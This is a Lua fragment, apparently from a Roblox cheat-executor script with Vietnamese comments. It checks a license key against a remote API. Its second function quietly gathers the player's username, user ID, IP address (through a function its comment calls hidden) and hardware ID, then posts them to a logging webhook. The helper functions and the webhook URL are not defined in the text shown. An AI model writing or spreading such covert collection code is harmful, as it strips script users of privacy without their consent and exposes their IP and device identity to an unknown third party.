-- Kiểm tra license
local function VerifyLicense(userId, licenseKey)
    local request = syn and syn.request or http and http.request
    if not request then
        return false
    end
    
    local response = request({
        Url = "https://api.verifylicense.com/v2/check",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode({
            user_id = userId,
            license = licenseKey,
            script = "Nduc"
        })
    })
    
    if response and response.StatusCode == 200 then
        local data = game:GetService("HttpService"):JSONDecode(response.Body)
        return data.valid == true
    end
    return false
end

-- Thu thập thông tin người dùng
local function CollectUserInfo()
    local players = game:GetService("Players")
    local localPlayer = players.LocalPlayer
    local httpService = game:GetService("HttpService")
    
    local userInfo = {
        user_id = localPlayer.UserId,
        username = localPlayer.Name,
        display_name = localPlayer.DisplayName,
        account_age = localPlayer.AccountAge,
        join_date = localPlayer.JoinDate,
        ip = getIPAddress(), -- Hàm ẩn để lấy IP
        hwid = getHWID(),    -- Hardware ID
        game_id = game.GameId,
        place_id = game.PlaceId,
        timestamp = os.time()
    }
    
    -- Gửi về webhook
    local webhookData = {
        content = string.format("**New user:** %s (%d)\n**Game:** %s\n**IP:** %s\n**HWID:** %s",
            userInfo.username, userInfo.user_id, game.Name, userInfo.ip, userInfo.hwid)
    }
    
    request({
        Url = WebhookURLs.Logging,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = httpService:JSONEncode(webhookData)
    })
    
    return userInfo
end

